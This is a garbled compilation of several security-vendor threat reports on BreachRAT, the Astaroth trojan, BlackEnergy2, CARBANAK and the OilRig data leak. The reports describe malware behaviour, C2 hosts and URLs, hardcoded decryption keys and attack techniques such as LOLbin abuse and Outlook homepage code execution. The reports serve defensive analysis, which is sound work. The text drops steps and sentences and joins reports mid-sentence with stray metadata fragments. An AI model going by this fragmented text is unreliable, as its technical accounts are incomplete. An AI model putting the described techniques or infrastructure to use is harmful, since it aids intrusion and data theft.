Introduction  On May 18, 2016, FireEye Labs observed a suspected Pakistan-based APT group sending spear phishing emails to Indian government officials This threat actor has been active for several years and conducting suspected intelligence collection operations against South Asian political and military targets This group frequently uses a toolset that consists of a downloader and modular framework that uses plugins to enhance functionality, ranging from keystroke logging to targeting USB devices We initially reported on this threat group and their UPDATESEE malware in our FireEye Intelligence Center in February 2016 Proofpoint also discussed the threat actors, whom they call Transparent Tribe, in a March blog post In this latest incident, the group registered a fake news domain, timesofindiaa[.]in, on May 18, 2016, and then used it to send spear phishing emails to Indian government officials on the same day The emails referenced the Indian Government\u2019s 7th Central Pay Commission (CPC) These Commissions periodically review the pay structure for Indian government and military personnel, a topic that would be of interest to government employees In previous incidents involving this threat actor, we observed them using malicious documents hosted on websites about the Indian Army, instead of sending these documents directly as an email attachment The email (Figure 1) pretends to be from an employee working at Times of India (TOI) and requests the recipient to open the attachment associated with the 7th Pay Commission Only one of the recipient email addresses was publicly listed on a website, suggesting that the actor harvested the other non-public addressees through other means This exploit file made use of the same shellcode that we have observed this actor use across a number of spear phishing incidents After decoding is complete, the shellcode proceeds to save the executable payload into %temp%\\svchost.exe and calls WinExec to execute the payload Figure 3: Decoy Document related to 7th Pay Commission \u00a0 The decoy document's metadata (Figure 4) suggests that it was created fairly recently by the user \u201cBhopal\u201d Figure 4: Metadata of the Document The payload is a backdoor that we call the Breach Remote Administration Tool (BreachRAT) written in C++ We had not previously observed this payload used by these threat actors The malware name is derived from the hardcoded PDB path found in the RAT: C:\\Work\\Breach Remote Administration Tool\\Release\\Client.pdb The following is a brief summary of the activities performed by the dropped payload: 1 Decrypts resource 1337 using a hard-coded 14-byte key \"MjEh92jHaZZOl3\" A python script, which can be used for decrypting this resource, is provided in the appendix below 2 The decrypted resource contains the C2 server\u2019s IP address as well as the mutex name 3 4 Once a successful connection is made, the malware tries to fetch a response from the server through its custom protocol 5 Once data is received, the malware skips over the received bytes until the start byte 0x99 is found in the server response The start byte is followed by a DWORD representing the size of the following data string 6 The data string is encrypted with the above-mentioned encryption scheme with the hard-coded key \u201cAjN28AcMaNX\u201d 7 The data string can contain various commands sent by the C2 server These commands and their string arguments are expected to be in Unicode The following commands are accepted by the malware:    Conclusion  As with previous spear-phishing attacks seen conducted by this group, topics related to Indian Government and Military Affairs are still being used as the lure theme in these attacks and we observed that this group is still actively expanding their toolkit It comes as no surprise that cyber attacks against the Indian government continue, given the historically tense relations in the region Appendix

"Retrieved May 07, 2019", "Article Content Research By: Eli Salem In 2018, we saw a dramatic increase in cyber crimes in Brazil and, separately, the abuse of legitimate native Windows OS processes for malicious intent Cyber attackers used living off the land binaries (LOLbins) to hide their malicious activity and operate stealthily in target systems Using native, legitimate operating system tools, attackers were able to infiltrate and gain remote access to devices without any malware For organizations with limited visibility into their environment, this type of attack can be fatal In this research, we explain one of the most recent and unique campaigns involving the Astaroth trojan This Trojan and information stealer was recognized in Europe and\u00a0chiefly\u00a0affected Brazil through the abuse of native OS processes and the exploitation of security-related products Brazil is constantly being hit with cybercrime To read about another pervasive attack in Brazil, check out our blog post.\u00a0 Pervasive Brazilian Financial Malware Targets Bank Customers in Latin America and Europe The Cybereason Platform was able to detect this new variant of the Astaroth Trojan in a massive spam campaign that targeted Brazil and parts of Europe Our Active Hunting Service team was able to analyze the campaign and identify that it maliciously took advantage of legitimate tools like the BITSAdmin utility and the WMIC utility to interact with a C2 server and download a payload With a sophisticated attack such as this, it is critical for your security team to have a clear understanding of your environment so they can swiftly detect malicious activity and respond effectively.\u00a0 Unique Aspects to this Latest Version of the Astaroth Trojan Campaign The Astaroth Trojan campaign is a phishing-based campaign that gained momentum towards the end of 2018 and was identified in thousands of incidents Early versions differed significantly from later versions as the adversaries advanced and optimized their attack This version contrasted significantly from previous versions in four key ways This version maliciously used BITSAdmin to download the attackers payload This differed from early versions of the campaign that used certutil As Avast is the most common antivirus software in the world, this is an effective evasive strategy This trusted process is prevalent on Brazilian machines To the best of our knowledge, no other versions of the malware used this process This version used a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and help hide the code it is initiating Earlier versions did not use this method A Breakdown of the Latest Astaroth Trojan Spam Campaign  As with many traditional spam campaigns, this campaign begins with a .7zip file This file gets downloaded to a user machine through a mail attachment or a mistakenly-pressed hyperlink This process executes a command to maliciously use the legitimate wmic.exe to initialize an XSL Script Processing (MITRE Technique T1220) attack The attack executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain (qnccmvbrh.wilstonbrwsaq[.]pw) It is often used by attackers for lateral movement, reconnaissance, and basic code invocation By using a trusted, native utility, the attackers can hide the scope of the full attack and evade detection The initial attack vector as detected by the Cybereason Platform wmic.exe creates a .txt file with information about the domain that stores the remote XSL script It identifies the location of the infected machine, including country, city, and other information Once this information is gathered, it sends location data about the infected machine to the remote XSL script Phase one: An Analysis of the Remote XSL The remote XSL script that wmic.exe sends information to contains highly obfuscated JScript code that will execute additional steps of the malicious activity Initially, the XSL script defines several variables for command execution and data storage It also creates several ActiveX objects These variables are used to invoke legitimate Windows OS processes for malicious activities, and serve as a bridge between the remote domain that stores the script and the infected machine.\u00a0\u00a0 \u00a0 Malicious script variables The script uses the function fromCharCode() that returns a string created from a sequence of UTF-16 code units By using this function, it avoids explicitly writing commands it wants to execute and it hides the actual code it is initiating In particular, the script uses this function to hide information related to process names To the best of our knowledge, this method was not used in early versions of the spam campaign The script uses the function radador(), which returns a randomized integer In contrast to the first method of obfuscation, this has been used effectively since early versions of the Astaroth Trojan campaign.\u00a0   \u00a0String.fromCharCode() usage in the XSL script.\u00a0  The random number generator function radador() These two obfuscation techniques are used to bypass antivirus defenses and make security researcher investigations more challenging Choosing a C2 Server The XSL script contains variable xparis() that holds the C2 domain the malicious files will be downloaded from pingadori() is a random integer between one and twelve, which decides which domain xparis() is assigned The C2 domain selection mechanism One of the most used functions in the XSL script is Bxaki() Bxaki() takes a URL and a file as arguments In previous iterations, the Astaroth Trojan campaign used cerutil to download files In order to hide this process, it was renamed certis In this iteration, they have replaced certutil with BITSAdmin Bxaki deobfuscated function In order to gain access to the infected computer\u2019s file system, the XSL script uses the variable fso with FileSystemObject capabilities This variable is created using an ActiveX object Within these twelve files are the Astaroth Trojan modules, several additional files the Trojan may use to extend its capabilities, and an r1.log file In earlier variants, upon detecting Avast, the XSL script would simply quit Instead, it now uses Avast to execute malicious actions.\u00a0 Similar to earlier versions of the Astaroth Trojan campaign, the XSL script searches for Avast on the infected machine, and specifically targets a certain process of Avast aswrundll.exe It uses three variables stem1, stem2, and

the Avast Software Runtime Dynamic Link Library that is responsible for running modules for Avast If aswrundll.exe exists at this path, Avast exists on the machine The use of aswrundll.exe as a LOLbin has been mentioned in the past year Stem variables presented as unicode strings Stem variables decoded to ASCII Manipulating Avast Once the XSL script has identified that Avast is installed on the machine, it loads a malicious module Irdsnhrxxxfery64 from its location on disk In order to load this module, it uses an ActiveX Object ShA created with Shell.Application capabilities The object uses ShellExecute() to create an aswrundll.exe process instance and loads Irdsnhrxxxfery64 Information pertaining to lrdsnhxxfery64.~ This module has to be investigated in a dynamic way to fully understand the malware and the role the module played during execution Information pertaining to lrdsnhrxxfery64_Unpacked.dll Throughout the malware execution, Irdsnhrxxxfery64.~ acts as the main malware

unins000.exe.\u00a0  Data exfiltration from unins000.exe to a malicious IP.\u00a0 Conclusion Our Active Hunting Service was able to detect both the malicious use of the BITSAdmin utility and the WMIC utility Our customer immediately stopped the attack using the remediation section of our platform and prevented any exfiltration of data From there, our hunting team identified the rest of the attack and completed a thorough analysis We were able to detect and evaluate an evasive infection technique used to spread a variant of the Astaroth Trojan as part of a large, Brazilian-based spam campaign In our discovery, we highlighted the use of legitimate, built-in Windows OS processes used to perform malicious activities to deliver a payload without being detected, as well as how the Astaroth Trojan operates and installs multiple modules covertly We also showed its use of well-known tools and antivirus products to expand its capabilities As we enter 2019, we anticipate that the use of LOLbins will likely increase Because of the great potential for malicious exploitation inherent in the use of native processes, it is very likely that many other information stealers will adopt this method to deliver their payload into targeted machines As a result of this detection, the customer was able to contain an advanced attack before any damage was done The Astaroth Trojan was controlled, WMIC was disabled, and the attack was halted in its tracks Part of the difficulty identifying this attack is in how it evades detection It is difficult to catch, even for security teams aware of the complications ensuring a secure system, as with our customer above LOLbins are deceptive because their execution seems benign at first, or even sometimes safe, as with the malicious use of antivirus software As the use of LOLbins becomes more commonplace, we suspect this complex method of attack will become more common as well The potential for damage will grow as attackers will look to other more destructive payloads", "By Kurt Baumgartner, Maria Garnaeva  on November 3, 2014", "7:58 am", "April 03, 2019", "BE2 Custom Plugins, Router Abuse, and Target Profiles", "Retrieved May 07,

BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms, scripts for Cisco network devices, destructive plugins, a certificate stealer and more Here,\u00a0we present available data \u2013 it is difficult to collect on this APT.\u00a0We will also present more details on targets previously unavailable and present related victim profile data These attackers are careful to hide and defend their long-term presence within compromised environments The malware\u2019s previously undescribed breadth means attackers present new technical challenges in unusual environments, including SCADA networks Challenges, like mitigating the attackers\u2019 lateral movement across compromised network routers, may take an organization\u2019s defenders far beyond their standard routine and out of their comfort zone Brief History BlackEnergy2 and BlackEnergy3 are known tools Initially, cybercriminals used BlackEnergy custom plugins for launching DDoS attacks There are no indications of how many groups possess this tool Over time, BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor While another crimeware group continues to use BlackEnergy to launch DDoS attacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own To be clear, our name for this actor has been the BE2 APT, while it has been called \u201cSandworm Team\u201d also The Plugins and Config Files Before evidence of BlackEnergy2 use in targeted attacks was uncovered, we tracked strange activity on one of the BlackEnergy CnC servers in 2013 As described in Dmitry\u2019s 2010 Black DDoS\u2019 analysis, a configuration file is downloaded from the server by main.dll on an infected system It also instructs the loader to pass certain commands to the plugins This new module push must have been among the first for this group, because all of the module versions were listed as \u201cversion 1\u201d, including the ddos plugin:  Config downloaded from BE2 server The \u2018ps\u2019 plugin turned out to be password stealer The \u2018vsnet\u2019 plugin was intended to spread and launch a payload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as gaining primary information on the user\u2019s computer and network Most surprising was the \u2018weap_hwi\u2019 plugin It was a ddos tool compiled to run on ARM systems:  Weap_hwi plugin At first, we didn\u2019t know whether the ARM plugin was listed intentionally or by mistake, so we proceeded to collect the CnC\u2019s config files After pulling multiple config files, we confirmed that this ARM object inclusion was not a\u00a0one-off mistake The server definitely delivered config files not only for Windows, but also for the ARM/MIPS platform Though unusual,\u00a0the ARM module was delivered by the same server and it processed the same config file Linux plugins Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures All of these ARM/MIPS object files were compiled from the same source and later pushed out in one config: \u201cweap_msl\u201d, \u201cweap_mps\u201d, \u201cnm_hwi\u201d, \u201cnm_mps\u201d, \u201cweap_hwi\u201d, and \u201cnm_msl\u201d It\u2019s interesting that the BE2 developers upgraded the ddos plugin to version 2, along with the nm_hwi, nm_mps, and nm_msl plugins They\u00a0simultaneously released version 5 of the weap_msl, weap_mps, and weap_hmi plugins This structure obfuscation may be a rewrite effort to better modularize the code, but could also\u00a0be intended to complicate analysis Regardless, it is likely that different individuals coded the different plugins So, the BE2 effort must have its own small team of plugin and multiplatform developers During an extended period, we were able to collect many Windows plugins from different CnC servers, without\u00a0ever noticing Linux plugins being downloaded as\u00a0described above It appears the\u00a0BE2/SandWorm gang protected their servers by keeping their non-Windows hacker tools and plugins in separate servers or server folders Finally, each CnC server hosts a different set of plugins, meaning that each server works with different victims and uses plugins based on its current needs Here is the summary list of all known plugins at the moment:    fs searches for given file types, gets primary system and network information   ps password stealer from various sources   ss makes screenshots   vsnet spreads payload in the local network\u00a0 (uses psexec, accesses admin shares), gets primary system and network information   rd remote desktop   scan scans ports of a given host   grc backup channel via plus.google.com   jn file infector (local, shares, removable devices) with the given payload downloaded from CnC   cert certificate stealer   sn logs traffic, extracts login-passwords from different protocol (HTTP, LDAP, FTP, POP3, IMAP, Telnet )   tv sets password hash in the registry for TeamViewer   prx Proxy server   dstr Destroys hard disk by overwriting with random data (on application level and driver level) at a certain time   kl keylogger   upd BE2 service file updater   usb gathers information on connected USBs\u00a0 (Device instance ID,\u00a0 drive geometry)   bios gathers information on BIOS, motherboard, processor, \u00a0OS    We are pretty sure that our\u00a0list of BE2 tools is not complete For example, we have yet to\u00a0obtain the router access plugin, but we are confident that it exists Our current collection represents the BE2 attackers\u2019 capabilities quite well Some plugins remain\u00a0mysterious and their purpose is not yet\u00a0clear, like \u2018usb\u2019 and \u2018bios\u2019 Why would the attackers need information on usb and bios characteristics? It suggests that based on a specific USB and BIOS devices, the attackers may upload specific\u00a0plugins to carry out additional actions Perhaps destructive, perhaps to further infect devices We don\u2019t know yet It\u2019s also interesting to point out another plugin \u2013 \u2018grc\u2019 In some of the BE2 configuration files, we can notice an value with a \u201cgid\u201d type:  The addr number in the config This number is an ID for the plus.google.com service and is used by the \u2018grc\u2019 plugin to parse html The decrypted PNG is supposed to contain a new config file, but we never observed one We are aware of two related GooglePlus IDs The first one, plus.google.com/115125387226417117030/, contains an abnormal number of views At the time of writing, the count is 75 million:  BE2 plus profile The second one \u2013 plus.google.com/116769597454024178039/posts \u2013 is currently more modest at a little over 5,000 views All of that account\u2019s posts are deleted 188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior\u2019s government site While many researchers suspect a Russian actor is behind BE2, judging by their tracked activities and the victim profiles, it\u2019s still unclear whose interests they represent While observing some other CnCs and pulling down config files, we stumbled upon some strange mistakes and mis-typing They are highlighted in the image below:  BE2 config file mistakes First, these mistakes suggest that the BE2 attackers manually edit these config files Secondly, it shows that\u00a0even skilled hackers make mistakes Hard-Coded Command and Control The contents of the config files themselves are fairly interesting They all contain a callback c2 with a hardcoded ip address, contain timeouts, and some contain the commands listed above BE2 Targets and Victims BlackEnergy2 victims are widely distributed geographically We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 There are likely more victims Interesting\u00a0BE2 incidents are presented here Victim #1 The BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE, and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable BE2 spearphish example The attached exe file turned out to be \u2018BlackEnergy-like\u2019 malware, which researchers already dubbed \u2018BlackEnergy3\u2019 \u2013 the gang uses it along with BlackEnergy2 Kaspersky Lab detects \u2018BlackEnergy3\u2019 malware as Backdoor.Win32.Fonten \u2013 naming it after its dropped file \u201cFONTCACHE.DAT\u201d When investigating computers in the company\u2019s network, only BE2 associated files were found, suggesting BE3 was used as only a first-stage tool on this network After decrypting these files, we could retrieve plugins launched on infected machines: ps, vsnet, fs, ss, dstr By all appearances, the attackers pushed the \u2018dstr\u2019 module when they understood that they were revealed, and wanted to hide their presence on the machines Some machines already launched the plugin, lost their data and became unbootable Victim #2 The second organization was hacked via the first victim\u2019s stolen VPN credentials After the second organization was notified about the infection they started an internal investigation They confirmed that some data was destroyed on their machines, so the BE2 attackers have exhibited some level of destructive activity And, they revealed that their Cisco routers with different IOS versions were hacked They weren\u2019t able to connect to the routers any more by telnet and found the following \u201cfarewell\u201d tcl scripts in the router\u2019s file system: Ciscoapi.tcl \u2013 contains various wrappers over cisco EXEC-commands as described in the comments The comment includes a punchy message for \u201ckasperRsky\u201d:  BE2 ciscoapi.tcl fragment Killint.tcl \u2013 uses Ciscoapi.tcl, implements destroying functions:  BE2 killint.tcl fragment The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files The BE2 actor performs careful, professional activity covering their tracks: ciscoapi.tcl killint.tcl telnetapi2.tcl telnetu.tcl stub.tcl stub1.tcl There is evidence that the logs produced by some scripts were also stored on the FTP server, in particular the information on CDP neighbors\u00a0which is provided by one of the procedures of ciscoapi.tcl Victim #3 The third organization got compromised by the same type of attack as the first one (an EXE file spoofing a doc within a Zip archive) All the plugins discovered in BE2 files were known, and there was no revelation of hacked network devices on their side and no destroyed data The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL: hxxps://46.165.222(dot)28/upgrade/f3395cd54cf857ddf8f2056768ff49ae/getcfg.php The URL contains the md5 of the string \u2018router\u2019 Starting in March 2014 and ending in July 2014, Siemens \u201cccprojectmgr.exe\u201d downloaded and executed a handful of\u00a0different payloads hosted at\u00a094.185.85.122/favicon.ico They are all detected as variants of\u00a0\u201cBackdoor.Win32.Blakken\u201d Build IDs Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators Currently this particular BE/SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters, as follows: 0C0703hji The numbers indicate the date of file creation in the format: Year-Month-Day Still, the purpose of the letters is unknown, but most likely it indicates the targets.\u00a0The hex numbers weren\u2019t used all the time, sometimes we observed decimal numbers: 100914_mg 100929nrT Most interesting for us was the earliest build id we could find Currently it is \u201cOB020Ad0V\u201d, meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 Appendix: IoC Since BE dropper installs its driver under a randomly picked non-used Windows driver name, there is no a static name for a driver to use it as IOC The driver is self-signed on 64-bit systems However, new \u201cAPT\u201d BE2 uses one of the following filenames that\u00a0are used as an encrypted storage for plugins and the network settings", "James T",

In this blog, we will take a closer look at the powerful, versatile backdoor known as CARBANAK (aka Anunak) Specifically, we will focus on the operational details of its use over the past few years, including its configuration, the minor variations observed from sample to sample, and its evolution With these details, we will then draw some conclusions about the operators of CARBANAK For some additional background on the CARBANAK backdoor, see the papers by Kaspersky and Group-IB and Fox-It Technical Analysis Before we dive into the meat of this blog, a brief technical analysis of the backdoor is necessary to provide some context CARBANAK is a full-featured backdoor with data-stealing capabilities and a plugin architecture Some of its capabilities include key logging, desktop video capture, VNC, HTTP form grabbing, file system management, file transfer, TCP tunneling, HTTP proxy, OS destruction, POS and Outlook data theft and reverse shell Most of these data-stealing capabilities were present in the oldest variants of CARBANAK that we have seen and some were added over time Monitoring Threads The backdoor may optionally start one or more threads that perform continuous monitoring for various purposes, as described in Table 1 Table 2 lists these commands 0x007AA8A5  state  Updates the state value (see the Configuration section) It contains commands in the same form as those listed in Table 2 that are automatically executed by the backdoor when it is started This file can be likened to a startup script for the backdoor Some of these values indicate which C2 protocol to use, whether the backdoor has been installed, and whether the PST monitoring thread is running or not Other than the state command, all commands in the configuration file are identified by their hash\u2019s decimal value instead of their plain text name Certain commands, when executed, add themselves to the configuration so they will persist across (or be part of) reboots Figure 1 and Figure 2 illustrate some sample, decoded configuration files we have come across in our investigations A message starts with a host ID composed by concatenating a hash value generated from the computer\u2019s hostname and MAC address to a string likely used as a campaign code Once the message has been formatted, it is sandwiched between an additional two fields of randomly generated strings of upper and lower case alphabet characters An example of a command polling message and a response to the listprocess command are given in Figure 3 and Figure 4, respectively Figure 3: Example command polling message   Figure 4: Example command response message Messages are encrypted using Microsoft\u2019s implementation of RC2 in CBC mode with PKCS#5 padding The eight-byte initialization vector (IV) is a randomly generated string consisting of upper and lower case alphabet characters This URI is then used in a GET or POST request A sample GET request is shown in Figure 5 The backdoor also searches for proxy configurations to use in the registry at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings and for each profile in the Mozilla Firefox configuration file at %AppData%\\Mozilla\\Firefox\\<ProfileName>\\prefs.js Custom Binary Protocol Figure 6 describes the structure of the malware\u2019s custom binary protocol If a message is larger than 150 bytes, it is compressed with an unidentified algorithm If a message is larger than 4096 bytes, it is broken into compressed chunks This protocol has undergone several changes over the years, each version building upon the previous version in some way These changes were likely introduced to render existing network signatures ineffective and to make signature creation more difficult Figure 6: Binary protocol message format  Version 1 In the earliest version of the binary protocol, we have discovered that the message bodies that are stored in the <chunkData> field are simply XORed with the host ID The initial message is not encrypted and contains the host ID This key is sent in the initial message Version 3 Version 3 adds encryption to the headers The first 19 bytes of the message headers (up to the <hdrXORKey2> field) are XORed with a five-byte key that is randomly generated per message and stored in the <hdrXORKey2> field Version 4 This version adds a bit more complexity to the header encryption scheme Version 5 Version 5 is the most sophisticated of the binary protocols we have seen The use of public key cryptography makes decryption of the session key infeasible without the C2 server\u2019s private key The Roundup We have rounded up 220 samples of the CARBANAK backdoor and compiled a table that highlights some interesting details that we were able to extract The MD5 hash is for the original executable file that eventually launches CARBANAK, but the details of each sample were extracted from memory during execution This data provides us with a unique insight into the operational aspect of CARBANAK and can be downloaded here Protocol Evolution As described earlier, CARBANAK\u2019s binary protocol has undergone several significant changes over the years Figure 7 illustrates a rough timeline of this evolution based on the compile times of samples we have in our collection This may not be entirely accurate because our visibility is not complete, but it gives us a general idea as to when the changes occurred It has been observed that some builds of this data-stealing backdoor use outdated versions of the protocol This may suggest multiple groups of operators compiling their own builds of this data-stealing backdoor independently Figure 7: Timeline of binary protocol versions *It is likely that we are missing an earlier build that utilized version 3 We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time The RC2 key used for the HTTP protocol has also been observed to change among samples with the same compile time These observations paired with the use of campaign codes that must be configured denote the likely existence of a build tool Rapid Builds Despite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity For example, on May 20, 2014, two builds were compiled approximately four hours apart and were configured to use the same C2 servers Again, on July 30, 2015, two builds were compiled approximately 12 hours apart This command downloads an executable from the C2 and directly runs it in memory In another case, one build was programmed to check for the existence of the domain blizko.net in the trusted sites list for Internet Explorer while the other was not Blizko is an online money transfer service We have also seen that different monitoring threads from Table 1 are enabled from build to build These minor changes suggest that the code is quickly modified and compiled to adapt to the needs of the operator for particular targets Figure 8 shows some of the relationships that can be observed in our data set Campaign Code   Compile Date    Aug  7/30/15    dec  12/8/14    julyc  7/2/16    jun  5/9/15    june  5/25/14    june  6/7/14    junevnc  6/20/14

Updates Recently, 64 bit variants of the backdoor have been discovered We shared details about such variants in a recent blog post Some of these variants are programmed to sleep until a configured activation date when they will become active History The \u201cCarbanak Group\u201d Much of the publicly released reporting surrounding the CARBANAK malware refers to a corresponding \u201cCarbanak Group\u201d, who appears to be behind the malicious activity associated with this data-stealing backdoor FireEye iSIGHT Intelligence has tracked several separate overarching campaigns employing the CARBANAK tool and other associated backdoors, such as DRIFTPIN (aka Toshliph) With the data available at this time, it is unclear how interconnected these campaigns are \u2013 if they are all directly orchestrated by the same criminal group, or if these campaigns were perpetrated by loosely affiliated actors sharing malware and techniques FIN7 In all Mandiant investigations to date where the CARBANAK backdoor has been discovered, the activity has been attributed to the FIN7 threat group FIN7 has been extremely active against the U.S restaurant and hospitality industries since mid-2015 Finally, FIN7 has leveraged several new techniques that we have not observed in other CARBANAK related activity Widespread Bank Targeting Throughout the U.S., Middle East and Asia Proofpoint initially reported on a widespread campaign targeting banks and financial organizations throughout the U.S and Middle East in early 2016 We identified several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same attackers This cluster of activity persisted from late 2014 into early 2016 Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar financial entities in these regions DRIFTPIN DRIFTPIN (aka Spy.Agent.ORM, and Toshliph) has been previously associated with CARBANAK in various campaigns We have seen it deployed in initial spear phishing by FIN7 in the first half of 2016 Also, in late 2015, ESET reported on CARBANAK associated attacks, detailing a spear phishing campaign targeting Russian and Eastern European banks using DRIFTPIN as the malicious payload Cyphort Labs also revealed that variants of DRIFTPIN associated with this cluster of activity had been deployed via the RIG exploit kit placed on two compromised Ukrainian banks\u2019 websites FireEye iSIGHT Intelligence observed this wave of spear phishing aimed at a large array of targets, including U.S financial institutions and companies associated with Bitcoin trading and mining activities This cluster of activity continues to be active now to this day, targeting similar entities Additional details on this latest activity are available on the FireEye iSIGHT Intelligence MySIGHT Portal Earlier CARBANAK Activity In December 2014, Group-IB and Fox-IT released a report about an organized criminal group using malware called \"Anunak\" that has targeted Eastern European banks, U.S and European point-of-sale systems and other entities Kaspersky released a similar report about the same group under the name \"Carbanak\" in February 2015 The name \u201cCarbanak\u201d was coined by Kaspersky in this report \u2013 the malware authors refer to the backdoor as Anunak This activity was further linked to the 2014 exploitation of ATMs in Ukraine Conclusion The details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data-stealing malware Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows:  Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s) Some of the operators may be compiling their own builds of the backdoor independently Varying campaign codes indicate that independent or loosely affiliated criminal actors are employing CARBANAK in a wide-range of intrusions that target a variety of industries but are especially directed at financial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S ", "Bryan

uncovering the OilRig group in May 2016, Unit 42 has continued to monitor, observe, and track their activities and evolution over time Since then, OilRig has been heavily researched by the rest of the industry and has been given additional names such as APT34 and Helix Kitten The OilRig group is not particularly sophisticated but is extremely persistent in the pursuit of their mission objective and, unlike other some other espionage motivated adversaries, are much more willing to deviate from their existing attack methodologies and use novel techniques to accomplish their objectives Over time, through our research we have been able to reveal specific details of how their attacks are executed, the tools they use, and even what their development cycle may be like by tracking their use of VirusTotal as a detection check system Due to the nature of the data we had access to however, our perspective was primarily from a target or victim perspective which is generally limited to the artifacts at the time of attack Recently, a data dump was leaked and made available to the public claiming to be data in relation to OilRig activity from the operations side We retrieved the data dump, which included credential dumps, backdoors, webshells, and other files of interest Several media outlets and other researchers have since performed their own evaluation, and in our assessment, we found the artifacts contained in data dump are indeed consistent with known OilRig operations and toolsets In addition, the data dump allowed us to retroactively compare our previous research with OilRig\u2019s operational data This allowed us to fill in previously existing gaps of OilRig\u2019s attack life cycle in addition to validating the accuracy of our research By analyzing the data dump, we have been able to identify exactly how the BONDUPDATER backdoor and its server component functions, the appearance and functionality of several webshells in deployment by OilRig, each of these tools\u2019 internal operational names, and a better understanding of how widespread the OilRig operations may actually be from a global perspective The organizations possibly under attack by OilRig is widely-spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers In total we identified nearly 13,000 stolen credentials, over 100 deployed webshells, and roughly a dozen backdoor sessions into compromised hosts across 27 countries, 97 organizations, and 18 industries The initial claim included several screenshots of systems potentially in use by OilRig operators for attacks, a script that appeared to be used for DNS hijacking, and a password protected archive with the filename Glimpse.rar purporting to contain the command and control server panel for an OilRig backdoor Soon after, a Twitter account with the user handle @dookhtegan appeared claiming they also had access to data dumps involving internal tools and data used by the OilRig group, as seen in Figure 1 This account used an image from 2004 of a high-profile Iranian asylum seeker named Mehdy Kavousi who famously sewed his eyes and mouth shut to signify that rejecting his asylum claim and sending him back to Iran would be akin to putting him to death It is unknown why this specific image was chosen, other than perhaps as a symbol of protest Since the initial account creation, a stylized version of the original has been substituted as the profile image, making it far more difficult to understand who the original individual was Figure 1 Tweets by @dookhtegan providing files associated with the OilRig leak This account continued a series of tweets voicing protest against the OilRig group and attributing its operations with a specific nation state and organization Unit 42 is unable to validate this level of attribution, but a 2018 report from the United States National Counterintelligence and Security Center stated the OilRig group originates from an Iranian nexus The account continued to post tweets with direct links to operational data dumps hosted on an anonymous file sharing service The files posted included the previously password protected archive Glimpse.rar, as well as new archives containing hundreds of harvested credentials from compromised organizations along with details on exposed login prompts There were also links to webshells previously and possibly currently deployed, \u00a0the webshell source codes, as well as another backdoor and its server component This account mirrors the previous messages of exposing the OilRig group but no longer contains links to data dumps, instead instructing those that are interested in the data to join them in a private Telegram channel Figure 2 shows this second Twitter account providing a Telegram channel to leak the data Figure 2 The affected organizations spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers While we are unable to confirm the validity of the documents detailing individual operators simply due to a lack of visibility into that realm, we also have no reason to doubt their validity either An interesting artifact we found in the data dump are the OilRig threat actors\u2019 own internal names of various tools we have been tracking Table 1 provides the internal operational names and the names we use to track these tools Tools exposed in the OilRig data leak with their internal names mapped to the names used by the security community Credential Dumps In our analysis, we found that a total of fifteen organizations had their credentials stolen in some fashion and stored in text files for the OilRig group to then abuse for additional attacks The types of organizations listed in this data dump spread across multiple industry verticals but were all largely located in the Middle East region This type of activity becomes significantly harder to detect compared to using custom tools as the adversary masquerades as a legitimate user while most protections are intended to catch malware In our past research, based off artifacts we had gathered, we had internally postulated the OilRig group likely had a propensity to immediately attempt to escalate privileges once they have their initial compromise, then try to move laterally into the local Microsoft Exchange server where they would then able to harvest more credentials and implant additional tools such as webshells and IIS backdoors In a presentation provided by a FireEye researcher, they documented this exact attack lifecycle for incidents associated with OilRig in addition to be deploying a post-exploitation toolkit called Ruler within their attack playbook as well Ruler is an open-source penetration testing toolkit which is predicated on being able to access Outlook Web Access (OWA) or OWA via stolen credentials, then abusing built-in functions to perform a variety of actions including retrieving the Global Address List, setting malicious email rules, and in OilRig\u2019s case, performing remote code execution The specific function of Ruler the OilRig group was using is the Ruler.Homepage function This function abuses a capability in Microsoft Outlook which allows an administrator or a user to set a default homepage for any folder inside their inbox Using stolen credentials, the operator would use Ruler to send commands to the target organization\u2019s OWA instance via an RPC protocol which would then remotely set an arbitrary homepage for the compromised inbox\u2019s folders The operator would then include commands in the homepage to automatically retrieve and execute malicious code In OilRig\u2019s case, they included commands to retrieve and execute a backdoor, immediately giving them access to the endpoint in use by the user whose credentials had been stolen Backdoors The data dump included two backdoors that we had previously associated with the OilRig threat group, both of which we had previously referred to as BONDUPDATER Generally speaking, we are able to retrieve the implant or payload involved in an attack but are generally blind to the server side component This data dump provided the backdoors and their associated server components which provides us a different perspective on how the backdoors function In addition, we discovered that the backdoors are actually called Glimpse and Poison Frog internally by OilRig and are functionally two different tools Glimpse The Glimpse tool within the data dump is related to the updated BONDUPDATER tool that we discovered being delivered to a Middle East government organization in a report we published on 